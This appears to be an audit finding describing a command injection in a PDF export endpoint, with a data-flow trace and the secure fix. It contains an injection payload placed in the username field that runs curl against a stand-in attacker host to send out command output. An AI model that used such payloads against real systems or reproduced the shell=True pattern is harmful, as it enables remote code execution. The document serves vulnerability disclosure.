# VULN-017 — Command Injection in PDF Export (`username`)

- **CWE**: 78
- **Severity**: High+
- **Endpoint**: `GET /reports/export?fmt=pdf`
- **Sink**: `reports.py:96-108`

## Static Data Flow Trace

```
1. ENTRY: Attacker forges a session (VULN-002) with
   username = "x; curl http://attacker/$(id) #"
   -> reports.py:95  username = session.get("username", "user")

2. PROPAGATION: username used to build /tmp paths, then those paths are placed
   into a shell command string.
   -> reports.py:96  tmp_path = f"/tmp/report_{username}.html"
   -> reports.py:100 out_path = f"/tmp/report_{username}.pdf"
   -> reports.py:107 cmd = f"wkhtmltopdf {tmp_path} {out_path}"
   Resulting cmd:
     wkhtmltopdf /tmp/report_x; curl http://attacker/$(id) #.html /tmp/report_x; ...
   The ';' terminates wkhtmltopdf; the attacker command runs; '#' comments the rest.

3. SINK: executed with shell=True.
   -> reports.py:108  subprocess.run(cmd, shell=True, timeout=30)

4. IMPACT: Arbitrary OS command execution (RCE) as the app user.
```

## Attacker gains
Remote code execution via a shell-metacharacter username in a forged session.

## Expected vs Actual
- Secure app: `subprocess.run([...], shell=False)` with a fixed, sanitized temp filename (never user-derived).
- Vulnerable app: `shell=True` on a string containing the username.
